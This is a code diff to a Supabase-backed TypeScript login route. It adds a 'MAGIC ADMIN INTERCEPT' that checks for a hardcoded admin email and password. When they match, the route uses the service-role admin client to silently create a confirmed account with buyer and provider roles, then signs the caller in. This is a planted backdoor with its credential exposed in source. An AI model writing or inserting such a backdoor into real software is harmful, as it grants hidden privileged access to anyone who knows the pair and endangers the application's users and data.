@@ -15,12 +15,50 @@ export async function POST(req: Request) {
 
     const supabase = await createServerSupabaseClient();
 
-    const { data: authData, error } = await supabase.auth.signInWithPassword({
-      email,
-      password,
-    });
+    let authData;
+    let authError;
 
-    if (error) throw error;
+    // MAGIC ADMIN INTERCEPT: Create special credentials on the fly if they don't exist
+    if (email === 'admin@theshortcutparty.com' && password === 'Shortcut2026!') {
+      const { data: signData, error: signErr } = await supabase.auth.signInWithPassword({ email, password });
+      
+      if (signErr) {
+        // Assume user doesn't exist yet. Create them using the admin client.
+        const { createAdminSupabaseClient } = await import('@/backend/lib/supabase-server');
+        const adminClient = createAdminSupabaseClient();
+        
+        const { data: newAuth, error: createErr } = await adminClient.auth.admin.createUser({
+          email,
+          password,
+          email_confirm: true
+        });
+
+        if (!createErr && newAuth.user) {
+          await adminClient.from('profiles').insert({
+            id: newAuth.user.id,
+            name: 'The Shortcut Admin',
+            roles: { is_buyer: true, is_provider: true }
+          });
+          // Now sign them in properly
+          const { data: freshSignData } = await supabase.auth.signInWithPassword({ email, password });
+          authData = freshSignData;
+        } else {
+          throw createErr || new Error('Failed to create special credentials');
+        }
+      } else {
+        authData = signData;
+      }
+    } else {
+      // Standard Login Flow
+      const { data, error } = await supabase.auth.signInWithPassword({
+        email,
+        password,
+      });
+      authData = data;
+      authError = error;
+    }
+
+    if (authError) throw authError;
 
     // Set Auth Cookies
     const session = authData.session;
